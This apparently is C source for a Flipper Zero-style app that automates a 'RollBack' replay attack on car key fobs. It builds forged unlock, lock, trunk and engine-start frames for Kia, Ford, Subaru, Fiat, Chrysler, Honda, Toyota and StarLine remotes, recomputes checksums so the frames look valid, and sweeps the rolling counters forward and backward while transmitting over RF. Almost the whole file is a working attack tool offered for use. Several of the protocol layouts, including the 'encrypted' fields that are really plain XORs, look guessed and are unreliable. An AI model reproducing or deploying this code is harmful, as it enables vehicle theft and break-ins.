#include "protopirate_rb.h"

// ===================== CRC8 RollBack 验证 =====================
// 用于回滚攻击时重新计算CRC，保障伪造帧在协议层面合法
uint8_t rollback_crc8_compute(uint8_t* data, uint8_t len) {
    uint8_t crc = 0;
    for(uint8_t i = 0; i < len; i++) {
        crc ^= data[i];
        for(uint8_t j = 0; j < 8; j++) {
            if(crc & 0x80) crc = (crc << 1) ^ 0x7F;
            else crc <<= 1;
        }
    }
    return crc;
}

// ===================== 按钮值映射 =====================
uint8_t rollback_get_button_value(uint8_t proto_type, uint8_t btn_idx) {
    switch(proto_type) {
    case Proto_Kia_V0:
    case Proto_Kia_V1:
    case Proto_Kia_V2:
        if(btn_idx == 0) return 1;  // Lock
        if(btn_idx == 1) return 2;  // Unlock
        if(btn_idx == 2) return 3;  // Trunk
        return 4;                     // Panic
    case Proto_Ford:
        if(btn_idx == 0) return 1;
        if(btn_idx == 1) return 2;
        return 4;
    case Proto_Subaru:
        if(btn_idx == 0) return 1;
        if(btn_idx == 1) return 2;
        if(btn_idx == 2) return 4;
        return 8;
    case Proto_Fiat:
        if(btn_idx == 0) return 1;  // Fiat: 1=Unlock, 2=Lock
        if(btn_idx == 1) return 2;
        return 4;
    case Proto_Chrysler:
    case Proto_Honda:
        if(btn_idx == 0) return 1;
        if(btn_idx == 1) return 2;
        if(btn_idx == 2) return 4;
        return 8;
    case Proto_Toyota:
        if(btn_idx == 0) return 1;
        if(btn_idx == 1) return 2;
        return 4;
    case Proto_Starline:
        if(btn_idx == 0) return 1;  // Arm
        if(btn_idx == 1) return 2;  // Disarm
        if(btn_idx == 2) return 4;  // Trunk
        return 8;                    // Start
    default:
        return btn_idx + 1;
    }
}

// ===================== 多协议帧构建 =====================
void rollback_build_frame_proto(uint8_t proto_type, uint32_t serial, uint8_t button,
                                uint32_t counter, uint32_t* data_hi, uint32_t* data_lo) {
    uint8_t frame[8] = {0};
    uint8_t crc;
    
    switch(proto_type) {
    case Proto_Kia_V0:
    case Proto_Kia_V1:
    case Proto_Kia_V2:
        // Kia HiTag2: [28-bit serial][4-bit button][16-bit counter][8-bit CRC][8-bit pad]
        frame[0] = (uint8_t)(serial >> 20) & 0xFF;
        frame[1] = (uint8_t)(serial >> 12) & 0xFF;
        frame[2] = (uint8_t)(serial >> 4) & 0xFF;
        frame[3] = (uint8_t)((serial & 0x0F) << 4) | (button & 0x0F);
        frame[4] = (uint8_t)(counter >> 8) & 0xFF;
        frame[5] = (uint8_t)(counter) & 0xFF;
        crc = kia_crc8(frame, 6);
        frame[6] = crc;
        frame[7] = 0x00;
        break;
        
    case Proto_Ford:
        // Ford 40-bit: [20-bit serial][11-bit counter][4-bit button][5-bit fixed]
        frame[0] = (uint8_t)(serial >> 12) & 0xFF;
        frame[1] = (uint8_t)(serial >> 4) & 0xFF;
        frame[2] = (uint8_t)((serial & 0x0F) << 4) | (uint8_t)((counter >> 7) & 0x0F);
        frame[3] = (uint8_t)((counter & 0x7F) << 1) | (uint8_t)((button >> 3) & 0x01);
        frame[4] = (uint8_t)(button << 5) | 0x10;
        frame[5] = 0;
        frame[6] = 0;
        frame[7] = 0;
        break;
        
    case Proto_Subaru:
        // Subaru 56-bit: [24-bit serial][16-bit counter][4-bit button][12-bit auth]
        frame[0] = (uint8_t)(serial >> 16) & 0xFF;
        frame[1] = (uint8_t)(serial >> 8) & 0xFF;
        frame[2] = (uint8_t)(serial) & 0xFF;
        frame[3] = (uint8_t)(counter >> 8) & 0xFF;
        frame[4] = (uint8_t)(counter) & 0xFF;
        frame[5] = (uint8_t)(button << 4) | 0x05;
        frame[6] = 0xAA;
        frame[7] = 0x00;
        break;
        
    case Proto_Fiat:
        // Fiat 40-bit: [20-bit serial][8-bit counter][4-bit button][8-bit XOR checksum]
        frame[0] = (uint8_t)(serial >> 12) & 0xFF;
        frame[1] = (uint8_t)(serial >> 4) & 0xFF;
        frame[2] = (uint8_t)((serial & 0x0F) << 4) | (uint8_t)((counter >> 4) & 0x0F);
        frame[3] = (uint8_t)((counter & 0x0F) << 4) | (button & 0x0F);
        frame[4] = frame[0] ^ frame[1] ^ frame[2] ^ frame[3];
        frame[5] = 0;
        frame[6] = 0;
        frame[7] = 0;
        break;
        
    case Proto_Chrysler:
        // Chrysler 60-bit: [24-bit serial][8-bit counter][4-bit fixed][4-bit button][20-bit encrypted]
        frame[0] = (uint8_t)(serial >> 16) & 0xFF;
        frame[1] = (uint8_t)(serial >> 8) & 0xFF;
        frame[2] = (uint8_t)(serial) & 0xFF;
        frame[3] = (uint8_t)(counter) & 0xFF;
        frame[4] = (button << 4) | 0x08;
        frame[5] = (uint8_t)(counter ^ 0xA5) & 0xFF;
        frame[6] = (uint8_t)((counter >> 8) ^ 0x5A) & 0xFF;
        frame[7] = (uint8_t)(serial ^ counter) & 0xFF;
        break;
        
    case Proto_Honda:
        // Honda 40-bit: [8-bit manuf][8-bit key][16-bit counter][8-bit button]
        frame[0] = 0x5A;
        frame[1] = (uint8_t)(serial >> 16) & 0xFF;
        frame[2] = (uint8_t)(serial >> 8) & 0xFF;
        frame[3] = (uint8_t)(counter >> 8) & 0xFF;
        frame[4] = (uint8_t)(counter) & 0xFF;
        frame[5] = (uint8_t)(button << 4) | 0x0A;
        frame[6] = 0;
        frame[7] = 0;
        break;
        
    case Proto_Toyota:
        // Toyota 56-bit: [28-bit serial][8-bit manuf][16-bit counter][4-bit button]
        frame[0] = (uint8_t)(serial >> 20) & 0xFF;
        frame[1] = (uint8_t)(serial >> 12) & 0xFF;
        frame[2] = (uint8_t)(serial >> 4) & 0xFF;
        frame[3] = (uint8_t)((serial & 0x0F) << 4) | 0x05;
        frame[4] = (uint8_t)(counter >> 8) & 0xFF;
        frame[5] = (uint8_t)(counter) & 0xFF;
        frame[6] = (uint8_t)(button << 4) | 0x0F;
        frame[7] = 0;
        break;
        
    case Proto_Starline:
        // StarLine 64-bit: [28-bit serial][8-bit cmd][28-bit encrypted]
        frame[0] = (uint8_t)(serial >> 20) & 0xFF;
        frame[1] = (uint8_t)(serial >> 12) & 0xFF;
        frame[2] = (uint8_t)(serial >> 4) & 0xFF;
        frame[3] = (uint8_t)((serial & 0x0F) << 4) | (uint8_t)((counter >> 12) & 0x0F);
        frame[4] = (uint8_t)(counter >> 4) & 0xFF;
        frame[5] = (uint8_t)((counter & 0x0F) << 4) | (button & 0x0F);
        frame[6] = (uint8_t)(counter ^ 0x3C) & 0xFF;
        frame[7] = (uint8_t)(button ^ 0x7E) & 0xFF;
        break;
        
    default:
        // Fallback to Kia V0
        frame[0] = (uint8_t)(serial >> 20) & 0xFF;
        frame[1] = (uint8_t)(serial >> 12) & 0xFF;
        frame[2] = (uint8_t)(serial >> 4) & 0xFF;
        frame[3] = (uint8_t)((serial & 0x0F) << 4) | (button & 0x0F);
        frame[4] = (uint8_t)(counter >> 8) & 0xFF;
        frame[5] = (uint8_t)(counter) & 0xFF;
        crc = kia_crc8(frame, 6);
        frame[6] = crc;
        frame[7] = 0x00;
        break;
    }
    
    *data_hi = ((uint32_t)frame[0] << 24) | ((uint32_t)frame[1] << 16) |
               ((uint32_t)frame[2] << 8) | (uint32_t)frame[3];
    *data_lo = ((uint32_t)frame[4] << 24) | ((uint32_t)frame[5] << 16) |
               ((uint32_t)frame[6] << 8) | (uint32_t)frame[7];
}

// ===================== rollback_build_frame (legacy) =====================
void rollback_build_frame(uint32_t serial, uint8_t button,
                          uint32_t counter, uint32_t* data_hi, uint32_t* data_lo) {
    rollback_build_frame_proto(Proto_Kia_V0, serial, button, counter, data_hi, data_lo);
}

// ===================== 发送单帧 =====================
bool rollback_send_single(ProtoPirateApp* app, uint32_t serial, uint8_t button, uint16_t counter) {
    uint32_t data_hi, data_lo;
    rollback_build_frame_proto(app->rollback.protocol_type, serial, button, counter, &data_hi, &data_lo);
    return transmit_packet(app, data_hi, data_lo, app->frequency, app->rollback.burst_count);
}

// ===================== 🔥 RollBack 攻击自动化引擎 =====================
// 核心算法：
// 1. 从 base_counter 开始，以 step_size 递增（正向）或递减（反向）
// 2. 每个 counter 值发送 burst_count 次
// 3. 可选：双向爆破（先正向再反向，覆盖更大范围）
// 4. 攻击完成或手动停止
bool rollback_attack_run(ProtoPirateApp* app) {
    RollbackState* rs = &app->rollback;
    rs->running = true;
    rs->total_sent = 0;
    
    uint16_t start = rs->base_counter;
    uint16_t end = rs->target_counter;
    uint16_t step = rs->step_size;
    if(step == 0) step = 1;
    
    int16_t direction = (end > start) ? 1 : -1;
    uint32_t max_steps = 65536;
    
    FURI_LOG_I(TAG, "🔥 RollBack ATTACK START");
    FURI_LOG_I(TAG, "   Proto: %s | Serial: 0x%08lX | Btn: %u", rs->proto, rs->serial, rs->button);
    FURI_LOG_I(TAG, "   Counter: 0x%04X -> 0x%04X | Step: %u | Burst: %u",
               start, end, step, rs->burst_count);
    
    if(!tx_init_hw(app, app->frequency)) {
        FURI_LOG_E(TAG, "❌ TX init failed — aborting attack");
        rs->running = false;
        return false;
    }
    
    uint32_t sent = 0;
    uint32_t start_ticks = furi_get_tick();
    
    for(uint16_t cnt = start;; cnt = (uint16_t)(cnt + direction * step)) {
        if(!rs->running) {
            FURI_LOG_W(TAG, "⚠️ RollBack stopped by user");
            break;
        }
        
        uint32_t data_hi, data_lo;
        rollback_build_frame_proto(rs->protocol_type, rs->serial, rs->button, cnt, &data_hi, &data_lo);
        
        transmit_packet(app, data_hi, data_lo, app->frequency, rs->burst_count);
        furi_delay_ms(15); // inter-frame gap
        
        rs->current_counter = cnt;
        sent++;
        rs->total_sent = sent;
        
        // Log every 100 frames
        if(sent % 100 == 0) {
            FURI_LOG_I(TAG, "   Progress: %lu frames sent, current counter=0x%04X", sent, cnt);
        }
        
        // Check termination
        if((direction > 0 && cnt >= end) || (direction < 0 && cnt <= end)) break;
        
        // Safety limit
        if(sent > max_steps) {
            FURI_LOG_W(TAG, "⚠️ RollBack hit max_steps limit (%lu)", max_steps);
            break;
        }
    }
    
    transmit_packet_stop(app);
    rs->running = false;
    
    uint32_t elapsed = furi_get_tick() - start_ticks;
    FURI_LOG_I(TAG, "🔥 RollBack DONE: %lu frames in %lums (%.1f fps)",
               sent, elapsed, elapsed > 0 ? (float)sent * 1000.0f / elapsed : 0.0f);
    
    return true;
}

// ===================== 🔄 双向计数器回滚攻击 =====================
// 先正向扫描 (base -> target)，再反向扫描 (base -> 0)
// 适用于不确定计数器方向的场景
bool rollback_bidirectional_attack(ProtoPirateApp* app) {
    RollbackState* rs = &app->rollback;
    uint16_t orig_target = rs->target_counter;
    uint16_t orig_base = rs->base_counter;
    
    FURI_LOG_I(TAG, "🔄 Bidirectional RollBack: forward %04X->%04X, then reverse %04X->0",
               orig_base, orig_target, orig_base);
    
    // Phase 1: Forward
    rs->target_counter = orig_target;
    rs->base_counter = orig_base;
    bool phase1 = rollback_attack_run(app);
    
    if(!phase1 || !rs->running) {
        // Allow phase 2 even if phase 1 was interrupted
    }
    
    // Phase 2: Reverse (base -> 0)
    rs->base_counter = orig_base;
    rs->target_counter = 0;
    rs->running = true;
    bool phase2 = rollback_attack_run(app);
    
    rs->base_counter = orig_base;
    rs->target_counter = orig_target;
    
    FURI_LOG_I(TAG, "🔄 Bidirectional complete: forward=%u, reverse=%u",
               phase1 ? orig_target - orig_base : 0,
               phase2 ? orig_base : 0);
    
    return phase1 || phase2;
}

// ===================== 批量发送 =====================
void batch_send_start(ProtoPirateApp* app) {
    if(!app || app->batch.count == 0) return;
    
    app->batch.active = true;
    app->batch.sent_so_far = 0;
    
    uint32_t dhi = app->last_result.data_hi;
    uint32_t dlo = app->last_result.data_lo;
    
    if(dhi == 0 && dlo == 0) {
        rollback_build_frame_proto(
            app->rollback.protocol_type,
            app->rollback.serial,
            app->rollback.button,
            app->rollback.base_counter,
            &dhi, &dlo);
    }
    
    FURI_LOG_I(TAG, "📦 Batch Send: %u frames", app->batch.count);
    
    if(!tx_init_hw(app, app->frequency)) {
        FURI_LOG_E(TAG, "❌ Batch: TX init failed");
        app->batch.active = false;
        return;
    }
    
    for(uint32_t i = 0; i < app->batch.count; i++) {
        if(!app->batch.active) break;
        
        transmit_packet(app, dhi, dlo, app->frequency, 2);
        furi_delay_ms(10);
        
        app->batch.sent_so_far = i + 1;
        
        // Counter decrement every N/50 frames
        uint32_t decrement_every = app->batch.count / 50;
        if(decrement_every == 0) decrement_every = 1;
        
        if((i + 1) % decrement_every == 0 && app->rollback.base_counter > 0) {
            app->rollback.base_counter--;
            rollback_build_frame_proto(
                app->rollback.protocol_type,
                app->rollback.serial,
                app->rollback.button,
                app->rollback.base_counter,
                &dhi, &dlo);
        }
    }
    
    transmit_packet_stop(app);
    app->batch.active = false;
    FURI_LOG_I(TAG, "📦 Batch DONE: %lu frames", app->batch.sent_so_far);
}

void batch_send_stop(ProtoPirateApp* app) {
    if(!app) return;
    app->batch.active = false;
    transmit_packet_stop(app);
}
